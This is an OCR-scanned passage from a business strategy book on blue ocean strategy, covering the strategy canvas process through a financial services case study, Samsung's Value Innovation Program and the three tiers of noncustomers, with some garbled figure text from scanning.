managers\nare engaged in a structured process of reordering market realities in a\nfundamentally new way. Through reconstructing existing market elements\nacross industry and market boundaries, they will be able to free themselves\nfrom head-to-head competition in the red ocean. Figure 3-5 summarizes the\nsix-path framework.\n\nFIGURE 3-5\n\nFrom head-to-head competition to blue ocean creation\n\nBlue ocean creation\n\nHead-to-head competition\n\nIndustry Focuses on rivals within its Looks across alternative\nindustry industries\n\nStrategic group Focuses on competitive position Looks across strategic\nwithin strategic group groups within industry\n\nBuyer group Focuses on better serving the Redefines the industry\nbuyer group buyer group\n\nScope of product Focuses on maximizing the Looks across to\n\nor service offering value of product and service complementary product\nofferings within the bounds of its and service offerings\nindustry\n\nFunctional- Focuses on improving price Rethinks the functional-\n\nemotional performance within the emotional orientation of\n\norientation functional-emotional orientation its industry\nof its industry\n\nTime Focuses on adapting to external Participates in shaping\n\nexternal trends over time\n\ntrends as they occur\nWe are now ready to move on to building your strategy planning process\naround these six paths. We next look at how you reframe your strategy\nplanning process to focus on the big picture and apply these ideas in\nformulating your own blue ocean strategy.\nCHAPTER 4\n\nFocus on the Big Picture, Not the Numbers\n\n'Y ov NOW KNOW THE PATHS to creating blue oceans. The next question is,\nHow do you align your strategic planning process to focus on the big\npicture and apply these ideas in drawing your company’s strategy canvas to\narrive at a blue ocean strategy? This is no small challenge. Our research\nreveals that most companies’ strategic planning process keeps them wedded\nto red oceans. The process tends to drive companies to compete within\nexisting market space.\n\nThink of a typical strategic plan. It starts with a lengthy description of\ncurrent industry conditions and the competitive situation. Next is a\ndiscussion of how to increase market share, capture new segments, or cut\ncosts, followed by an outline of numerous goals and initiatives. A full\nbudget is almost invariably attached, as are lavish graphs and a surfeit of\nspreadsheets. The process usually culminates in the preparation of a large\ndocument culled from a mishmash of data provided by people from various\nparts of the organization who often have conflicting agendas and poor\ncommunication. In this process, managers spend the majority of strategic\nthinking time filling in boxes and running numbers instead of thinking\noutside the box and developing a clear picture of how to break from the\ncompetition. If you ask companies to present their proposed strategies in no\nmore than a few slides, it is not surprising that few clear or compelling\nstrategies are articulated.\nIt’s no wonder that few strategic plans lead to the creation of blue oceans\nor are translated into action. Executives are paralyzed by the muddle. Few\nemployees deep down in the company even know what the strategy is. And\na closer look reveals that most plans don’t contain a strategy at all but rather\na smorgasbord of tactics that individually make sense but collectively don’t\nadd up to a unified, clear direction that sets a company apart—let alone\nmakes the competition irrelevant. Does this sound like the strategic plans in\nyour company?\n\nThis brings us to the second principle of blue ocean strategy: focus on the\nbig picture, not the numbers. This principle is key to mitigating the planning\nrisk of investing lots of effort and lots of time but delivering only tactical\nred ocean moves. Here we develop an alternative approach to the existing\nstrategic planning process that is based not on preparing a document but on\ndrawing a strategy canvas.' This approach consistently produces strategies\nthat unlock the creativity of a wide range of people within an organization,\nopen companies’ eyes to blue oceans, and are easy to understand and\ncommunicate for effective execution.\nFocusing on the Big Picture\n\nIn our research and consulting work, we have found that drawing a strategy\ncanvas not only visualizes a company’s current strategic position in its\nmarketplace but also helps it chart its future strategy. By building a\ncompany’s strategic planning process around a strategy canvas, a company\nand its managers focus their main attention on the big picture rather than\nbecoming immersed in numbers and jargon and getting caught up in\noperational details.”\n\nAs previous chapters reveal, drawing a strategy canvas does three things.\nFirst, it shows the strategic profile of an industry by depicting very clearly\nthe factors (and the possible future factors) that affect competition among\nindustry players. Second, it shows the strategic profile of current and\npotential competitors, identifying which factors they invest in strategically.\nFinally, it shows the company’s strategic profile—or value curve—\ndepicting how it invests in the factors of competition and how it might\ninvest in them in the future. As discussed in chapter 2, the strategic profile\nwith high blue ocean potential has three complementary qualities: focus,\ndivergence, and a compelling tagline. If a company’s strategic profile does\nnot clearly reveal those qualities, its strategy will likely be muddled,\nundifferentiated, and hard to communicate. It is also likely to be costly to\nexecute.\nDrawing Your Strategy Canvas\n\nDrawing a strategy canvas is never easy. Even identifying the key factors of\ncompetition is far from straightforward. As you will see, the final list is\nusually very different from the first draft.\n\nAssessing to what extent your company and its competitors offer the\nvarious competitive factors is equally challenging. Most managers have a\nstrong impression of how they and their competitors fare along one or two\ndimensions within their own scope of responsibility, but very few can see the\noverall dynamics of their industry. The catering manager of an airline, for\nexample, will be highly sensitive to how the airline compares in terms of\nrefreshments. But that focus makes consistent measurement difficult; what\nseems to be a very big difference to the catering manager may not be\nimportant to customers, who look at the complete offering. Some managers\nwill define the competitive factors according to internal benefits. For\nexample, a CIO might prize the company’s IT infrastructure for its data-\nmining capacity, a feature lost on most customers, who are more concerned\nwith speed and ease of use.\n\nOver the past twenty years, we have developed a structured process for\ndrawing and discussing a strategy canvas that pushes a company’s strategy\ntoward a blue ocean. A financial services group that we’ ll call European\nFinancial Services (EFS) is one of the companies that adopted this process to\ndevelop a strategy that breaks away from the competition. The resulting EFS\nstrategy yielded a 30 percent revenue boost in its initial year. The process,\nwhich builds on the six paths of creating blue oceans and involves a lot of\nvisual stimulation in order to unlock people’s creativity, has four major steps\n(see figure 4-1).\n\nFIGURE 4-1\n\nThe four steps of visualizing strategy\n4.

Visual\n\nexploration\n\nGo into the field\nto explore the six\npaths to creating\nblue oceans.\n\nObserve the\ndistinctive\nadvantages\nof alternative\nproducts and\nservices.\n\nSee which factors\nyou should\neliminate, create,\nor change.\n\n1. Visual\nawakening\n\nCompare your\nbusiness with\nyour competitors’\nby drawing your\n“as is” strategy\ncanvas.\n\nSee where your\nstrategy needs\n\nto change.\n\nStep 1: Visual Awakening\n\nA common mistake is to discuss changes in strategy before resolving\ndifferences of opinion about the current state of play. Another problem is that\nexecutives are often reluctant to accept the need for change; they may have a\nvested interest in the status quo, or they may feel that time will eventually\nvindicate their previous choices. Indeed, when we ask executives what\nprompts them to seek out blue oceans and introduce change, they usually say\nthat it takes a highly determined leader or a serious crisis.\n\nFortunately, we’ve found that asking executives to draw the value curve of\ntheir company’s strategy brings home the need for change. It serves as a\nforceful wake-up call for companies to challenge their existing strategies.\nThat was the experience at EFS, which had been struggling for a long time\nwith an ill-defined and poorly communicated strategy. The company was\nalso deeply divided. The top executives of EFS’s regional subsidiaries\nbitterly resented what they saw as the arrogance of the corporate executives,\nwhose philosophy, they believed, was essentially “nuts in the field, brains in\nthe center.” That conflict made it all the more difficult for EFS to come to\ngrips with its strategic problems. Yet before the firm could chart a new\nstrategy, it was essential that it reach a common understanding of its current\nposition.\n\nEFS began the strategy process by bringing together more than twenty\nsenior managers from subsidiaries in Europe, North America, Asia, and\nAustralia and splitting them into two teams. One team was responsible for\nproducing a value curve depicting EFS’s current strategic profile in its\ntraditional corporate foreign exchange business relative to its competitors.\nThe other team was charged with the same task for EFS’s emerging online\nforeign exchange business. They were given ninety minutes, because if EFS\nhad a clear strategy, surely it would emerge quickly.\n\nIt was a painful experience. Both teams had heated debates about what\nconstituted a competitive factor and what the factors were. Different factors\nwere important, it seemed, in different regions and even for different\ncustomer segments. For example, Europeans argued that in its traditional\nbusiness, EFS had to offer consulting services on risk management, given\nthe perceived risk-averse nature of its customers. Americans, however,\ndismissed that as largely irrelevant. They stressed the value of speed and\nease of use. Many people had pet ideas of which they were the sole\nchampions. One person in the online team argued, for example, that\ncustomers would be drawn in by the promise of instant confirmations of\ntheir transactions—a service no one else thought necessary. This was a\nservice no player in the industry then offered. In fact, in early 2000, apart\nfrom a few select companies like Amazon, there were very few companies in\nany industry that offered automatic buyer confirmations.\n\nDespite these difficulties, the teams completed their assignments and\npresented their pictures in a general meeting of all participants. Their results\nare shown in figures 4-2 and 4-3.\n\nThe pictures clearly revealed defects in the company’s strategy. EFS’s\ntraditional and online value curves both demonstrated a serious lack of\nfocus; the company was investing in diverse and numerous factors in both\nbusinesses. What’s more, EFS’s two curves were very similar to those of\ncompetitors. Not surprisingly, neither team could come up with a memorable\ntagline that was true to the team’s value curve.\n\nFIGURE 4-2\n\nThe strategy canvas of corporate foreign exchange, offline\nHigh\n\n| | | | ]\nPrice Corporate Speed Ease Knowledge\n\nRisk 06895 86:86 Relationship Of Use Responsiveness\nmanagement payment terms management\nconsultancy\nFIGURE 4-3\n\nThe strategy canvas of corporate foreign exchange, online\n\nHigh\n\nEFS online\n‏ہج‎\n‎尔 弋\n\nলি\n\nOther online\ncompetitors\n\nLow\n\nSecurity\n\nWebsite Ease\n\nReal-time\nElectronic data fates Customer attractiveness 90660. ofuse — Accuracy\ninterchange support\n\nPrice\n\nThe pictures also highlighted contradictions. The online business, for\nexample, had invested heavily in making the website easy to use—it had\neven won awards for this—but it became apparent that speed had been\noverlooked. EFS had one of the slowest websites in the business, and that\nmight explain why such a well-regarded site did a relatively poor job of\nattracting customers and converting them into sales.\n\nThe sharpest shocks, perhaps, came from comparing EFS’s strategy with\nits competitors’. The online group realized that its strongest competitor,\nwhich we’ ve called Clearskies, had a focused, original, and easily\ncommunicable strategy: “One-click E-Z FX.” Clearskies, which was\ngrowing rapidly, was swimming away from the red ocean.\n\nFaced with direct evidence of the company’s shortcomings, EFS’s\nexecutives could not defend what they had shown to be a weak, unoriginal,\nand poorly communicated strategy. Trying to draw the strategy canvases had\nmade a stronger case for change than any argument based on numbers and\nwords could have done. This created a strong desire in top management to\nseriously rethink the company’s current strategy.\n\nStep 2: Visual Exploration\n\nGetting the wake-up call is only the first step. The next step is to send a\nteam into the field, putting managers face-to-face with what they must\nmake sense of: how people use or don’t use their products or services. This\nstep may seem obvious, but we have found that managers often outsource\nthis part of the strategy-making process. They rely on reports that other\npeople (often at one or two removes from the world they report on) have\nput together.\n\nAccompany should never outsource its eyes. There is simply no substitute\nfor seeing for yourself. Great artists don’t paint from other people’s\ndescriptions or even from photographs; they like to see the subject for\nthemselves. The same is true for great strategists. Michael Bloomberg,\nbefore becoming mayor of New York City, was hailed as a business\nvisionary for his realization that the providers of financial information also\nneeded to provide online analytics to help users make sense of the data. But\nhe would be the first to tell you that the idea should have been obvious to\nanyone who had ever watched traders using Reuters or Dow Jones Telerate\nat the time. Before Bloomberg, traders used paper, pencil, and handheld\ncalculators to write down price quotes and figure fair market values before\nmaking buy and sell decisions, a practice that cost them time and money as\nwell as built-in possible errors.\n\nGreat strategic insights like this are less the product of genius than of\ngetting into the field and challenging the boundaries of competition.* In the\ncase of Bloomberg, his insight came by switching the focus of the industry\nfrom IT purchasers to users: the traders and analysts. This allowed him to\nsee what was invisible to others.*\n\nObviously, the first port of call should be the customers. But you should\nnot stop there. You should also go after noncustomers.° And when the\ncustomer is not the same as the user, you need to extend your observations\nto the users, as Bloomberg did. You should not only talk to these people but\nalso watch them in action. Identifying the array of complementary products\nand services that are consumed alongside your own may give you insight\ninto bundling opportunities. Finally, you need to look at how customers\nmight find alternative ways of fulfilling the need that your product or\nservice satisfies. For example, driving is an alternative to flying, so you\nshould also examine its distinct advantages and characteristics.\n\nEFS sent its managers into the field for four weeks to explore the six\npaths to creating blue oceans.° In this process, each was to interview and\nobserve ten people involved in corporate foreign exchange, including lost\ncustomers, new customers, and the customers of EFS’s competitors and\nalternatives. The managers also reached outside the industry’s traditional\nboundaries to companies that did not yet use corporate foreign exchange\nservices but that might in the future, such as internet-based companies with\na global reach like Amazon.com that were just beginning to take off at the\ntime. They interviewed the end users of corporate foreign exchange services\n—the accounting and treasury departments of companies. And finally, they\nlooked at ancillary products and services that their customers used—in\nparticular, treasury management and pricing simulations.\n\nThe field research overturned many of the conclusions managers had\nreached in the first step of the strategy creation process. For example,\naccount relationship managers, whom nearly everyone had agreed were a\nkey to success and on whom EFS prided itself, turned out to be the\ncompany’s Achilles’ heel. Customers hated wasting time dealing with\nrelationship managers. To buyers, relationship managers were seen as\nrelationship savers because EFS failed to deliver on its promises.\n\nTo everyone’s astonishment, the factor customers valued most was\ngetting speedy confirmation of transactions, which only one manager had\npreviously suggested was important. The EFS managers saw that their\ncustomers’ accounting department personnel spent a lot of time making\nphone calls to confirm that payments had been made and to check when\nthey would be received. Customers received numerous calls on the same\nsubject, and the time wasted in handling them was compounded by the\nnecessity of making further calls to the foreign exchange provider, namely\nEFS or a competitor.\n\nEFS’s teams were then sent back to the drawing board. This time, though,\nthey had to propose a new strategy. Each team had to draw six new value\ncurves using the six path framework explained in chapter 3. Each new value\ncurve had to depict a strategy that would make the company stand out in its\nmarket. By demanding six pictures from each team, we hoped to push\nmanagers to create innovative proposals and break the boundaries of their\nconventional thinking.\n\nFor each visual strategy, the teams also had to write a compelling tagline\nthat captured the essence of the strategy and spoke directly to buyers.\nSuggestions included “Leave It to Us,” “Make Me Smarter,” and\n“Transactions in Trust.” A strong sense of competition developed between\nthe two teams, making the process fun, imbuing it with energy, and driving\nthe teams to develop blue ocean strategies.\nStep 3: Visual Strategy Fair\n\nAfter two weeks of drawing and redrawing, the teams presented their\nstrategy canvases at what we call a visual strategy fair. Attendees included\nsenior corporate executives but consisted mainly of representatives of EFS’s\nexternal constituencies—the kinds of people the managers had met with\nduring their field trips, including noncustomers, customers of competitors,\nand some of the most demanding EFS customers. In two hours, the teams\npresented all twelve curves—six by the online group, and six by the offline\ngroup. They were given no more than ten minutes to present each curve, on\nthe theory that any idea that takes more than ten minutes to communicate is\nprobably too complicated to be any good. The pictures were hung on the\nwalls so that the audience could easily see them.\n\nAfter the twelve strategies were presented, each judge—an invited\nattendee—was given five sticky notes and told to put them next to his or her\nfavorites. The judges could put all five on a single strategy if they found it\nthat compelling. The transparency and immediacy of this approach freed it\nfrom the politics that sometimes seem endemic to the strategic planning\nprocess. Managers had to rely on the originality and clarity of their curves\nand their pitches. One began, for example, with the line, “We’ve got a\nstrategy so cunning that you won’t be our customers, you’ll be our fans.”\n\nAfter the notes were posted, the judges were asked to explain their picks,\nadding another level of feedback to the strategy-making process. Judges\nwere also asked to explain why they did not vote for the other value curves.\n\nAs the teams synthesized the judges’ common likes and dislikes, they\nrealized that fully one-third of what they had thought were key competitive\nfactors were, in fact, marginal to customers. Another one-third either were\nnot well articulated or had been overlooked in the visual awakening phase. It\nwas clear that the executives needed to reassess some long-held\nassumptions, such as EFS’s separation of its online and traditional\nbusinesses.\n\nThey also learned that buyers from all markets had a basic set of needs\nand expected similar services. If you met those common needs, customers\nwould happily forgo everything else. Regional differences became\nsignificant only when there was a problem with the basics. This was news to\nmany people who had claimed that their regions were unique.\n\nFollowing the strategy fair, the teams were finally able to complete their\nmission. They were able to draw a value curve that was a truer likeness of\nthe existing strategic profile than anything they had produced earlier, in part\nbecause the new picture ignored the specious distinction that EFS had made\nbetween its online and offline businesses. More important, the managers\nwere now in a position to draw a future strategy that would be distinctive as\nwell as speak to a true but hidden need in the marketplace. Figure 4-4\nhighlights the stark differences between the company’s current and future\nstrategies.\n\nFIGURE 4-4\n\nEFS: Before and after\n\nHigh\n\nEFS’s “after” strategy\n\nEFS and other traditional\ncompetitors’ “before” strategy\n\nLow\n\nPrice ( Tracking\n骷愤胍s…peXeC…weS oo of Security Speed commentary Confirmation\nmanagement me ‏سے‎\n\n| | | _\nAccount Ease Accuracy Market\n\nAs the figure shows, EFS’s future strategy eliminated relationship\nmanagement and reduced investment in account executives, who, from this\npoint on, were assigned only to “AAA” accounts. These moves dramatically\nreduced EFS’s costs because relationship managers and account executives\nwere the highest-cost element of its business. EFS’s future strategy\nemphasized ease of use, security, accuracy, and speed. These factors would\nbe delivered through computerization, which would allow customers to input\ndata directly instead of having to send a fax to EFS, which was the industry\nnorm at the time.\n\nThis action would also free up corporate dealers’ time, a large portion of\nwhich had been spent completing paperwork and correcting errors. Dealers\nwould now be able to provide richer market commentary, a key success\nfactor. And EFS would send automatic electronic confirmations to all\ncustomers. It would also offer a payment-tracking service, just as FedEx and\nUPS do for parcels. The foreign exchange industry had never offered these\nservices before. Figure 4-5 summarizes EFS’s four actions to create value\ninnovation, the cornerstone of blue ocean strategy.\n\nFIGURE 4-5\n\nEliminate-reduce-raise-create grid: The case of EFS\nEliminate Raise\n\nRelationship management Ease of use\n\nSecurity\n\nAccuracy\n\nSpeed\n\nMarket commentary\n\nReduce Create\n\nAccount executives Confirmation\nCorporate dealers Tracking\n\nThe new value curve exhibited the criteria of a successful strategy. It\ndisplayed more focus than the previous strategy; investments that were made\nwere given a much stronger commitment than before. It also stood apart\nfrom the industry’s existing me-too curves and lent itself to a compelling\ntagline: “The FedEx of corporate foreign exchange: easy, reliable, fast, and\ntrackable.” By collapsing its online and traditional businesses into one\ncompelling offering, EFS substantially cut the operational complexity of its\nbusiness model, making systematic execution far easier.\n\nStep 4: Visual Communication\n\nAfter the future strategy is set, the last step is to communicate it in a way\nthat can be easily understood by any employee. EFS distributed the one-\npage picture showing its new and old strategic profiles so that every\nemployee could see where the company stood and where it had to focus its\nefforts to create a compelling future. The senior managers who participated\nin developing the strategy held meetings with their direct reports to walk\nthem through the picture, explaining what needed to be eliminated, reduced,\nraised, and created to pursue a blue ocean. Those people passed the message\non to their direct reports. Employees were so motivated by the clear game\nplan that many pinned up a version of the strategy canvas in their cubicles\nas a reminder of EFS’s new priorities and the gaps that needed to be closed.\n\nThe new picture became a reference point for all investment decisions.\nOnly those ideas that would help EFS move from the old to the new value\ncurve were given the go-ahead. When, for example, regional offices\nrequested that the IT department add links on the website—something that\nin the past would have been agreed to without debate—IT asked them to\nexplain how the new links helped move EFS toward its new profile. If the\nregional offices couldn’t provide an explanation, the request was denied,\nthereby promoting clarity and not confusion on the website. Similarly, when\nthe IT department pitched a multimillion-dollar back-office system to top\nmanagement, the system’s ability to meet the new value curve’s strategic\nneeds was the chief metric by which it was judged.\nVisualizing Strategy at the Corporate Level\n\nVisualizing strategy can also greatly inform the dialogue among individual\nbusiness units and the corporate center in transforming a company’s\nbusiness portfolio from red to blue. When business units present their\nstrategy canvases to one another, they deepen their understanding of the\nother businesses in the corporate portfolio. Moreover, the process also\nfosters the transfer of strategic best practices across units.\nUsing the Strategy Canvas\n\nTo see how this works, consider how Samsung Electronics of Korea used\nstrategy canvases. Let’s zoom in on one of its corporate conferences, for\nexample, that was attended by more than seventy top managers, including\nthe CEO. Here unit heads presented their canvases and implementation\nplans to senior executives and to one another. Discussions were heated, and\na number of unit heads argued that the freedom of their units to form future\nstrategies was constrained by the degree of competition they faced. Poor\nperformers felt that they had little choice but to match their competitors’\nofferings. That hypothesis proved to be false when one of the fastest-\ngrowing units—the mobile phone business—presented its strategy canvas.\nNot only did the unit have a distinctive value curve, but it also faced the\nmost intense competition.\n\nSamsung Electronics institutionalized the use of the strategy canvas in its\nkey business creation decisions by establishing the Value Innovation\nProgram (VIP) Center all the way back in 1998. Samsung was at a\ncrossroads at the time. With the aftermath of the 1997 Asian financial crisis\nstill being felt, the company, under the direction of its leader, Jong Yong\nYun, saw the dire need to break out of commodity-type competition and\ncreate products and businesses that were both differentiated and lower cost.\nOnly that, CEO Yun felt, would propel the company to become a leading\nconsumer electronics company of the future. With this aim, the VIP Center\nwas established under the influence of our value innovation theory.’ The\ncenter is a five-story building nestled amid the company’s enormous\nindustrial complex in Suwon, South Korea. Here, core cross-functional\nteam members of its various business units come together to discuss their\nstrategic projects with code names like Rainbow and Habana.* These\ndiscussions typically focus on strategy canvases.\n\nMore than two thousand people a year have been known to cycle through\nits VIP Center in Suwon, where designers, engineers, planners, and\nprogrammers gather for days—or months—to hammer out detailed\nspecifications for new products that will launch the company’s products\ntoward the blue ocean. The center has a core team of members who work to\nsupport the projects passing through the center, all focused on driving value\ninnovation into Samsung’s next-generation products. With the value\ninnovation knowledge it has developed, the center, equipped with twenty\nproject rooms, assists the units in making their product and service offering\ndecisions. On average, some ninety strategic projects pass through the\ncenter each year. Samsung also opened more than ten VIP branches to meet\nbusiness units’ rising demands.\n\nIn this spirit, Samsung Electronics has established an annual Value\nInnovation corporate conference presided over by all of its top executives.\nAt this conference, Samsung’s hit Value Innovation projects are shared\nthrough presentations and exhibitions, and awards are given to the best\ncases. This is one way that Samsung Electronics establishes a common\nlanguage system, instilling a corporate culture and strategic norms that\ndrive its corporate business portfolio from red to blue oceans.”\n\nSamsung Electronics has come a long way since the VIP Center was\nestablished. Its sales have grown from $16.6 billion in 1998 to $216.7\nbillion in 2013 and its brand value has catapulted with it. Samsung\nElectronics is now ranked as one of the top-ten most valuable global\nbrands. ۱\" While Samsung’s focus on driving value innovation has\ncontributed to its sales, brand value, and market leadership, it will need an\neven stronger value innovation push in the future as new lower-cost rivals\nand untraditional players enter the fast-moving, high-tech consumer\nelectronics industry.\n\nDo your business unit heads lack an understanding of the other\nbusinesses in your corporate portfolio? Are your strategic best practices\npoorly communicated across your business units? Are your low-performing\nunits quick to blame their competitive situations for their results? If the\nanswer to any of these questions is yes, try drawing, and then sharing, the\nstrategy canvases of your business units.\nUsing the Pioneer-Migrator-Settler (PMS) Map\n\nVisualizing strategy can also help managers responsible for corporate\nstrategy predict and plan the company’s future growth and profit. All the\ncompanies that created blue oceans in our study have been pioneers in their\nindustries, not necessarily in developing new technologies but in pushing\nthe value they offer customers to new frontiers. Extending the pioneer\nmetaphor can provide a useful way of talking about the growth potential of\ncurrent and future businesses.\n\nA company’s pioneers are the businesses that offer unprecedented value.\nThese are your blue ocean offerings, and they are the most powerful sources\nof profitable growth. These businesses have a mass following of customers.\nTheir value curve diverges from the competition on the strategy canvas. At\nthe other extreme are settlers—businesses whose value curves conform to\nthe basic shape of the industry’s. These are me-too businesses. Settlers will\nnot generally contribute much to a company’s future growth. They are stuck\nwithin the red ocean.\n\nThe potential of migrators lies somewhere in between. Such businesses\nextend the industry’s curve by giving customers more for less, but they\ndon’t alter its basic shape. These businesses offer improved value, but not\ninnovative value. These are businesses whose strategies fall on the margin\nbetween red oceans and blue oceans.\n\nA useful exercise for a corporate management team pursuing profitable\ngrowth is to plot the company’s current and planned portfolios on a pioneer-\nmigrator-settler (PMS) map. For the purpose of the exercise, settlers are\ndefined as me-too businesses, migrators are business offerings better than\nmost in the marketplace, and pioneers are your value innovation offerings.\n\nIf both the current portfolio and the planned offerings consist mainly of\nsettlers, the company has a low growth trajectory, is largely confined to red\noceans, and needs to push for value innovation. Although the company\nmight be profitable today as its settlers are still making money, it may well\nhave fallen into the trap of competitive benchmarking, imitation, and intense\nprice competition.\nIf current and planned offerings consist of a lot of migrators, reasonable\ngrowth can be expected. But the company is not exploiting its potential for\ngrowth, and it risks being marginalized by a company that value-innovates.\nIn our experience, the more an industry is populated by settlers, the greater\nis the opportunity to value-innovate and create a blue ocean of new market\nspace.\n\nThis exercise is especially valuable for managers who want to see beyond\ntoday’s performance. Revenue, profitability, market share, and customer\nsatisfaction are all measures of a company’s current position. Contrary to\nwhat conventional strategic thinking suggests, those measures cannot point\nthe way to the future; changes in the environment are too rapid. Today’s\nmarket share is a reflection of how well a business has performed\nhistorically. Think of the strategic reversal and market share upset that\noccurred when CNN entered the US news market. ABC, CBS, and NBC—\nall with historically strong market shares—were devastated.\n\nChief executives should instead use value and innovation as the important\nparameters for managing their portfolio of businesses. They should use\ninnovation because, without it, companies are stuck in the trap of\ncompetitive improvements. They should use value because innovative ideas\nwill be profitable only if they are linked to what buyers are willing to pay\nfor.\n\nClearly, what senior executives should be doing is getting their\norganizations to shift the balance of their future portfolio toward pioneers.\nThat is the path to profitable growth. The PMS map shown in figure 4-6\ndepicts this trajectory, showing the scatter plot of a company’s portfolio of\nbusinesses, where the gravity of its current portfolio of twelve businesses,\nexpressed as twelve dots, shifts from a preponderance of settlers to a\nstronger balance of migrators and pioneers.\n\nIn pushing their businesses toward pioneers, however, senior executives\nshould be well aware that even though settlers have marginal growth\npotential, they are frequently today’s cash generators. How can senior\nexecutives then balance between cash flow and growth at a given point in\ntime to maximize profitable growth at the corporate level? What would be\ntheir best renewal strategy for their portfolio of businesses over time? How\nwould such a renewal strategy work in action? We address these important\nquestions on renewal in chapter 10.\nFIGURE 4-6\n\nTesting the growth potential of a portfolio of businesses\n\nTomorrow\n\nPioneers\n\nMigrators\n\nSettlers\n\nOvercoming the Limitations of Strategic Planning\n\nManagers often express discontent, either explicitly or implicitly, with\nexisting strategic planning—the core activity of strategy. To them, strategic\nplanning should be more about collective wisdom building than top-down\nor bottom-up planning. They think that it should be more conversational\nthan solely documentation-driven, and it should be more about building the\nbig picture than about number-crunching exercises. It should have a\ncreative component instead of being strictly analysis-driven, and it should\nbe more motivational, invoking willing commitment, than bargaining-\ndriven, producing negotiated commitment. Despite this appetite for change,\nhowever, scant work exists on building a viable alternative to existing\nstrategic planning, which is the most essential management task in the sense\nthat almost every company in the world not only does it but often takes\nseveral grueling months each year to complete the exercise. Put differently,\nwhile companies have a clear process to create plans, as of yet there has\nbeen no theory or process for true strategy creation.\n\nWe believe the four-step process proposed here goes a long way to\ncorrect this situation. By being built around a picture, it addresses many of\nmanagers’ discontents with existing strategic planning and yields much\nbetter results. As Aristotle pointed out, “The soul never thinks without an\nimage.”\n\nDrawing a strategy canvas and a PMS map is not, of course, the only part\nof strategy making. At some stage, numbers and documents must be\ncompiled and discussed. But we believe that the details will fall into place\nmore easily if managers start with the big picture of how to break away\nfrom the competition. The methods of visualizing strategy proposed here\nwill put strategy back into strategic planning, and they will greatly improve\nyour chances of creating a blue ocean.\n\nHow do you maximize the size of the blue ocean you are creating? The\nfollowing chapter addresses that precise question.\nCHAPTER 5\n\nReach Beyond Existing Demand\n\nNo company wants to venture beyond red oceans only to find itself in a\npuddle. The question is, How do you maximize the size of the blue ocean\nyou are creating? This brings us to the third principle of blue ocean\nstrategy: reach beyond existing demand. This is a key component of\nachieving value innovation. By aggregating the greatest demand for a new\noffering, this approach attenuates the scale risk associated with creating a\nnew market.\n\nTo achieve this, companies should challenge two conventional strategy\npractices. One is the focus on existing customers. The other is the drive for\nfiner segmentation to accommodate buyer differences. Typically, to grow\ntheir share of a market, companies strive to retain and expand existing\ncustomers. This often leads to finer segmentation and greater tailoring of\nofferings to better meet customer preferences. The more intense the\ncompetition is, the greater, on average, is the resulting customization of\nofferings. As companies compete to embrace customer preferences through\nfiner segmentation, they often risk creating too-small target markets.\n\nTo maximize the size of their blue oceans, companies need to take a\nreverse course. Instead of concentrating on customers, they need to look to\nnoncustomers. And instead of focusing on customer differences, they need\nto build on powerful commonalities in what buyers value. That allows\ncompanies to reach beyond existing demand to unlock a new mass of\ncustomers that did not exist before.\n\nThink of Callaway Golf. It aggregated new demand for its offering by\nlooking to noncustomers. While the US golf industry fought to win a\ngreater share of existing customers, Callaway created a blue ocean of new\ndemand by asking why sports enthusiasts and people in the country club set\nhad not taken up golf as a sport. By looking to why people shied away from\ngolf, it found one key commonality uniting the mass of noncustomers:\nhitting the golf ball was perceived as too difficult. The small size of the golf\nclub head demanded enormous hand-eye coordination, took time to master,\nand required concentration. As a result, fun was sapped for novices, and it\ntook too long to get good at the sport.\n\nThis understanding gave Callaway insight into how to aggregate new\ndemand for its offering. The answer was Big Bertha, a golf club with a large\nhead that made it far easier to hit the golf ball. Big Bertha not only\nconverted noncustomers of the industry into customers, but it also pleased\nexisting golf customers, making it a runaway bestseller across the board.\nWith the exception of pros, it turned out that the mass of existing customers\nalso had been frustrated with the difficulty of advancing their game by\nmastering the skills needed to hit the ball consistently. The club’s large head\nalso lessened this difficulty.\n\nInterestingly, however, existing customers, unlike noncustomers, had\nimplicitly accepted the difficulty of the game. Although the mass of existing\ncustomers didn’t like it, they had taken for granted that that was the way the\ngame was played. Instead of registering their dissatisfaction with golf club\nmakers, they themselves accepted the responsibility to improve. By looking\nto noncustomers and focusing on their key commonalities—not differences\n—Callaway saw how to aggregate new demand and offer the mass of\ncustomers and noncustomers a leap in value. The result: Callaway sailed in\na lucrative blue ocean that lasted nearly a decade.\n\nWhere is your locus of attention—on capturing a greater share of existing\ncustomers, or on converting noncustomers of the industry into new\ndemand? Do you seek out key commonalities in what buyers value, or do\nyou strive to embrace customer differences through finer customization and\nsegmentation? To reach beyond existing demand, think noncustomers\nbefore customers; commonalities before differences; and desegmentation\nbefore pursuing finer segmentation.\nThe Three Tiers of Noncustomers\n\nAlthough the universe of noncustomers typically offers big blue ocean\nopportunities, few companies have keen insight into who noncustomers are\nand how to unlock them. To convert this huge latent demand into real\ndemand in the form of thriving new customers, companies need to deepen\ntheir understanding of the universe of noncustomers.\n\nThere are three tiers of noncustomers that can be transformed into\ncustomers. They differ in their relative distance from your market. As\ndepicted in figure 5-1, the first tier of noncustomers is closest to your\nmarket. They sit on the edge of the market. They are buyers who minimally\npurchase an industry’s offering out of necessity but are mentally\nnoncustomers of the industry. They are waiting to jump ship and leave the\nindustry as soon as the opportunity presents itself. However, if offered a\nleap in value, not only would they stay, but also their frequency of\npurchases would multiply, unlocking enormous latent demand.\n\nThe second tier of noncustomers is people who refuse to use your\nindustry’s offerings. These are buyers who have seen your industry’s\nofferings as an option to fulfill their needs but have voted against them. In\nthe Callaway case, for example, these were sports enthusiasts, especially the\ncountry club tennis set, who could have chosen golf but had consciously\nchosen against it.\n\nFIGURE 5-1\n\nThe three tiers of noncustomers\nFirst tier: “Soon-to-be” noncustomers who are on the edge of your market,\nwaiting to jump ship.\n\nSecond tier: “Refusing” noncustomers who consciously choose against\nyour market.\n\nThird tier: “Unexplored” noncustomers who are in markets distant from\nyours.\n\nThe third tier of noncustomers is farthest from your market. They are\nnoncustomers who have never thought of your market’s offerings as an\noption. By focusing on key commonalities across these noncustomers and\nexisting customers, companies can understand how to pull them into their\nnew market.\n\nLet’s look at each of the three tiers of noncustomers to understand how\nyou can attract them and expand your blue ocean.\nFirst-Tier Noncustomers\n\nThese soon-to-be noncustomers are those who minimally use the current\nmarket offerings to get by as they search for something better. Upon finding\nany better alternative, they will eagerly jump ship. In this sense, they sit on\nthe edge of the market. A market becomes stagnant and develops a growth\nproblem as the number of soon-to-be noncustomers increases. Yet locked\nwithin these first-tier noncustomers is an ocean of untapped demand\nwaiting to be released.\n\nConsider how Pret A Manger, a British fast-food chain that opened in\n1986, has expanded its blue ocean by tapping into the huge latent demand\nof first-tier noncustomers. 